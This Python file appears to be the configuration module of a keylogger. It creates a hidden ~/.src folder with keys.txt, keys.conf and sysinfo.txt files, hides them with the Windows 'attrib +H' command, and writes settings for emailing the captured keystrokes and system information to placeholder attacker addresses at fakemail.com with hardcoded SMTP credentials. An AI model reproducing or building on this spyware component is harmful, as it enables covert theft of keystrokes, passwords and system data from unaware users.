from configparser import ConfigParser
from os.path import expanduser
from os import makedirs
import subprocess
from pathlib import Path

usr = expanduser("~")
usr_src = Path(usr, '.src')


class Config(ConfigParser):

    def load(self):
        self.parser.read(self.confile_path)

        return self.parser

    @staticmethod
    def place_and_hide(fp_list: list):

        # For each filepath provided we 'touch' a matching file
        for fp in fp_list:
            # Write file, but write nothing
            with open(fp, 'a') as _:
                pass

            # Set windows file attribute '+H' which marks the file as 'hidden'
            subprocess.check_call(['attrib', '+H', fp])

    def first_write(self):
        file_name = 'keys.txt'
        conf_file_name = 'keys.conf'
        sysinfo_file_name = 'sysinfo.txt'

        makedirs(usr_src, exist_ok=True)

        key_filepath = Path(usr_src, file_name)
        conf_filepath = Path(usr_src, conf_file_name)
        sysinfo_filepath = Path(usr_src, sysinfo_file_name)

        data_files = [key_filepath, conf_filepath, sysinfo_filepath]

        self.place_and_hide(data_files)

        defaults = {
            'FILES': {
                'key-store': key_filepath,
                'sysinfo-store': sysinfo_filepath
            },
            'SENDMAIL.PARTIES': {
                'dest': '133754X0R@fakemail.com',
                'from': 'hax0r@fakermail.com'
            },
            'SENDMAIL.SERVER': {
                'host': 'smtp.fakemail.com',
                'port': 587,
            },
            'SENDMAIL.AUTH': {
                'login': 'hax0r@fakemail.com',
                'password': '1234'
            }

        }

        self.parser.read_dict(defaults)
        self.confile_path = conf_filepath

        with open(conf_filepath, 'r+') as config_file:
            self.parser.write(config_file)

    def __init__(self):
        super().__init__()
        self.confile_path = usr_src.joinpath('keys.conf')

        self.parser = ConfigParser()

        if not Path(self.confile_path).exists() or not Path(self.confile_path).is_file():
            self.first_write()
